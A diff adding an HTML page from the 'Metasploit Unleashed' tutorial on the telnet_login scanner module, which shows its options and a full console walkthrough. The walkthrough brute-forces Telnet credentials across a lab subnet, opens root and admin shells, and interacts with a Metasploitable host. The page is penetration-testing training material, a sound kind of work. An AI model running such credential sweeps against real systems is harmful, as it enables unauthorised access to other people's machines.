@@ -1,0 +1,45 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>auxiliary/scanner/telnet/telnet_login</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">auxiliary/scanner/telnet/telnet_login</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">The <b>telnet_login</b> module will
+take a list a provided set of
+credentials and a range of IP addresses and attempt to login to any
+Telnet servers it encounters.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">msf &gt; use auxiliary/scanner/telnet/telnet_login <br>msf auxiliary(telnet_login) &gt; show options<br><br>Module options:<br><br>   Name              Current Setting  Required  Description<br>   ----              ---------------  --------  -----------<br>   BLANK_PASSWORDS   true             yes       Try blank passwords for all users<br>   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5<br>   PASSWORD                           no        A specific password to authenticate with<br>   PASS_FILE                          no        File containing passwords, one per line<br>   RHOSTS                             yes       The target address range or CIDR identifier<br>   RPORT             23               yes       The target port<br>   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host<br>   THREADS           1                yes       The number of concurrent threads<br>   USERNAME                           no        A specific username to authenticate as<br>   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line<br>   USER_FILE                          no        File containing usernames, one per line<br>   VERBOSE           true             yes       Whether to print output for all attempts</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">This auxiliary module allows you to
+pass credentials in a number of
+ways. You can specifically set a username and password, you can pass a
+list of usernames and a list of passwords for it to iterate through, or
+you can provide a file that contains usernames and passwords separated
+by a space.
+We will configure the scanner to use a short usernames file and a
+passwords file and let it run against our subnet.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">msf auxiliary(telnet_login) &gt; set BLANK_PASSWORDS false<br>BLANK_PASSWORDS =&gt; false<br>msf auxiliary(telnet_login) &gt; set PASS_FILE passwords.txt<br>PASS_FILE =&gt; passwords.txt<br>msf auxiliary(telnet_login) &gt; set RHOSTS 192.168.1.0/24<br>RHOSTS =&gt; 192.168.1.0/24<br>msf auxiliary(telnet_login) &gt; set THREADS 254<br>THREADS =&gt; 254<br>msf auxiliary(telnet_login) &gt; set USER_FILE users.txt<br>USER_FILE =&gt; users.txt<br>msf auxiliary(telnet_login) &gt; set VERBOSE false<br>VERBOSE =&gt; false<br>msf auxiliary(telnet_login) &gt; run<br><br>[+] 192.168.1.116 - SUCCESSFUL LOGIN root : s00p3rs3ckret<br>[*] Command shell session 1 opened (192.168.1.101:50017 -&gt; 192.168.1.116:23) at 2010-10-08 06:48:27 -0600<br>[+] 192.168.1.116 - SUCCESSFUL LOGIN admin : s00p3rs3ckret<br>[*] Command shell session 2 opened (192.168.1.101:41828 -&gt; 192.168.1.116:23) at 2010-10-08 06:48:28 -0600<br>[*] Scanned 243 of 256 hosts (094% complete)<br>[+] 192.168.1.56 - SUCCESSFUL LOGIN msfadmin : msfadmin<br>[*] Command shell session 3 opened (192.168.1.101:49210 -&gt; 192.168.1.56:23) at 2010-10-08 06:49:07 -0600<br>[*] Scanned 248 of 256 hosts (096% complete)<br>[*] Scanned 250 of 256 hosts (097% complete)<br>[*] Scanned 255 of 256 hosts (099% complete)<br>[*] Scanned 256 of 256 hosts (100% complete)<br>[*] Auxiliary module execution completed</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">It seems that our scan has been
+successful and Metasploit has a few
+sessions open for us. Let's see if we can interact with one of them.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">msf auxiliary(telnet_login) &gt; sessions -l<br><br>Active sessions<br>===============<br><br>  Id  Type   Information                                    Connection<br>  --  ----   -----------                                    ----------<br>  1   shell  TELNET root:s00p3rs3ckret (192.168.1.116:23)   192.168.1.101:50017 -&gt; 192.168.1.116:23<br>  2   shell  TELNET admin:s00p3rs3ckret (192.168.1.116:23)  192.168.1.101:41828 -&gt; 192.168.1.116:23<br>  3   shell  TELNET msfadmin:msfadmin (192.168.1.56:23)     192.168.1.101:49210 -&gt; 192.168.1.56:23<br><br>msf auxiliary(telnet_login) &gt; sessions -i 3<br>[*] Starting interaction with 3...<br><br>id<br>id<br>uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)<br>msfadmin@metasploitable:~$ exit<br>exit<br>logout<br>[*] Command shell session 3 closed.<br>msf auxiliary(telnet_login) &gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Telnet_Scanners"
+ title="Telnet Scanners">Telnet Scanners</a></div>
+</body>
+</html>
